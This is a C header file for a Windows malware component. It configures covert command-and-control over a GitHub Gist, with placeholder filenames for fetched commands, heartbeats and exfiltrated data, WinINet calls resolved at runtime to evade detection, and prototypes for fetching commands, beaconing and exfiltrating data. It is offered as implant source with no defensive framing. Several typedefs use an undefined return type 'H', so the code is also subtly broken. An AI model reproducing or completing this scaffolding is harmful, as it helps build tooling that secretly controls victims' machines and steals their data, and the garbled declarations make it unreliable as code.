// c2_communication.h

#pragma once

#include <windows.h>

// --- C2 Configuration ---
// IMPORTANT: Replace these with your actual Gist ID and filenames
#define C2_GIST_ID "YOUR_GIST_ID_HERE"
#define C2_COMMAND_FILENAME "command.txt"
#define C2_HEARTBEAT_FILENAME "heartbeat.txt"
#define C2_EXFIL_FILENAME "exfil_data.txt"

// --- API Structures for Dynamic Resolution ---
// These are used to resolve WinINet functions at runtime for stealth
typedef H(WINAPI *pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef H(WINAPI *pInternetConnectA)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef H(WINAPI *pHttpOpenRequestA)(HINTERNET, LPCSTR, LPCSTR, DWORD, LPCSTR, LPCSTR*, DWORD, DWORD_PTR);
typedef BOOL(WINAPI *pHttpSendRequestA)(HINTERNET, LPCSTR, DWORD, LPVOID, DWORD);
typedef BOOL(WINAPI *pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI *pInternetCloseHandle)(HINTERNET);
typedef DWORD(WINAPI *pGetTickCount)(VOID);

// --- Command Structure ---
// This structure is used to hold the command and argument parsed from the C2
typedef struct {
    char command[256];
    char argument[256];
} C2Command;

// --- Function Prototypes ---
// These are the declarations for the functions implemented in c2_communication.cpp
// Any file that wants to use these functions must include this header

BOOL FetchCommand(C2Command* outCommand);
BOOL SendHeartbeat();
BOOL ExfiltrateData(const char* dataToExfil);
